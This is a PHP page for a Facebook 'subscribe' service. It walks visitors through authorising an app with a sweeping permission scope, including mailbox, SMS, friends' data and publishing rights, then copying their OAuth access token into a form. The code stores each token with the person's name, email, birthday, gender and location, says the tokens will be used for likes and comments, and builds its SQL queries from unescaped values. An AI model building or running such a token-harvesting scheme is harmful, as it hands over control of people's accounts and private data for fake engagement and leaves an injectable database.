<?php $title = "Facebook Subscribe"; require_once "includes/header.php"; require_once "visitorlocation/loc.php" ?>
<center>
<?php
	if(isset($_POST['subscribe'])){
		$access_token = BS1st::postValues($_POST['access_token']);
		if(empty($access_token)){
			echo "<div class='alert alert-danger'>Please, Insert Your Access Token .</div>";
		}else{
			$checkAccess_token = BS1st::FBRequests("me", "access_token=".$access_token, "GET");
			if(isset($checkAccess_token['error'])){
				if($checkAccess_token['error']['message'] == "Invalid OAuth access token.")
					echo "<div class='alert alert-danger'>Invalid Access Token .</div>";
				else if($checkAccess_token['error']['message'] == "The access token could not be decrypted")
					echo "<div class='alert alert-danger'>The access token could not be decrypted .</div>";
				else
					echo "<div class='alert alert-danger'>".$checkAccess_token['error']['message']."</div>";
			}else{
				$SID = $checkAccess_token['id']; // subscriber ID
				$getSameId = BS1st::SQL("SELECT * FROM fb_subscribers WHERE csite_id = '".$SID."'");
				if(BS1st::rowsNum($getSameId) >= 1){
					echo "<div class='alert alert-danger'>This User Is Subscriber With Us Before .</div>";
				}else{
					$SAT = $access_token; // subscriber Access Token
					$SBD = $checkAccess_token['birthday']; // subscriber BirthDay
					$SEL = $checkAccess_token['email']; // subscriber Email
					$SNE = $checkAccess_token['name']; // subscriber Name
					$SGR = $checkAccess_token['gender']; // subscriber Gender
					$SCY = $Country_Name; // Country Name
					$SCC = $Country_Code3; // Country Name Code 2 letters
					$SCT = $Continent_Name; // Continent Name
					$STC = $Continent_Code; //Continent Name Code
					$SFL = $checkAccess_token['location']['name'];// subscriber Facebook Location Name
					$SSD = date("Y/m/d - h:i:s a"); // subscriber subscribe Date
					switch($SCY){
						case "Iran" :
							$SCG = "khaligy"; // subscriber Category
						break;
						case "Saudi Arabia" :
							$SCG = "khaligy"; // subscriber Category
						break;
						case "United Arab Emirates" :
							$SCG = "khaligy"; // subscriber Category
						break;
						case "Kuwait" :
							$SCG = "khaligy"; // subscriber Category
						break;
						case "Qatar" :
							$SCG = "khaligy"; // subscriber Category
						break;
						case "Oman" :
							$SCG = "khaligy"; // subscriber Category
						break;
						case "Bahrain" :
							$SCG = "khaligy"; // subscriber Category
						break;
						case "Iraq" :
							$SCG = "khaligy"; // subscriber Category
						break;
						default :
							($SCY == 'Egypt' || $SCY == 'Yemen' || $SCY == 'Sudan' || $SCY == 'Libya' || $SCY == 'Tunisia' || $SCY == 'Algeria' || $SCY == 'Morocco' || $SCY == 'Mauritania' || $SCY == 'Somalia' || $SCY == 'Djibouti' || $SCY == 'Jordan' || $SCY == 'Syria' || $SCY == 'Lebanon' || $SCC == 'PS' || $SCY == 'Comoros') ? $SCG = "araby" : $SCG = "agnaby";
						break;
					}
					$addsubscriber = BS1st::SQL("INSERT INTO `fb_subscribers` (access_token, csite_id, name, country, category, date, birthday, email, gender, country_code, continent, continent_code, fb_location) VALUES ('".$SAT."', '".$SID."', '".$SNE."', '".$SCY."', '".$SCG."', '".$SSD."', '".$SBD."', '".$SEL."', '".$SGR."', '".$SCC."', '".$SCT."', '".$STC."', '".$SFL."')");
					if($addsubscriber == true)
						echo "<div class='alert alert-success'>You Have Been Subscriber With Us Successfully .</div>";
				}
			}
		}
	}
?>
<h4 class="alert alert-info">1- Go To This <a href="https://www.facebook.com/dialog/oauth?client_id=41158896424&scope=email,publish_stream,manage_pages,publish_actions,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token&redirect_uri=https://www.facebook.com/connect/login_success.html" target="_blank">Link</a> Then Accpet On The Application Permissions And You Will Redirect To Success Page Go To The Url Input Of Your Browser Then Click CTRL + Z from your Keyboard The Url Will Change To Other Url Between access_token=...Your Access Token...&amp;expires_in Copy It And Insert It Into The Field Below</h4>
<p class="alert alert-warning">See The Next Video If you can't get the access token .</p>
<iframe width="560" height="315" src="//www.youtube.com/embed/yCD3P2fN7j4" frameborder="0" allowfullscreen></iframe>
<form action=""  method="POST" class="center-block" role="form" style="width: 100%;">
	<div class="form-group">
		<h4 class='alert alert-warning'><span style='color: red'>Note : </span><span style='color: #f80'>We Will Use Your Access Token in Making Likes &amp; Comments For Pages & Profiles on Facebook .</span></h4>
        <label for="access_token">Your Access Token</label>
        <input type="text" name="access_token" class="form-control" id="access_token" />
    </div>
	<button type="submit" class="btn btn-primary btn-lg btn-block" name="subscribe">subscribe</button>
</form>
</center>
<?php include_once "includes/footer.php";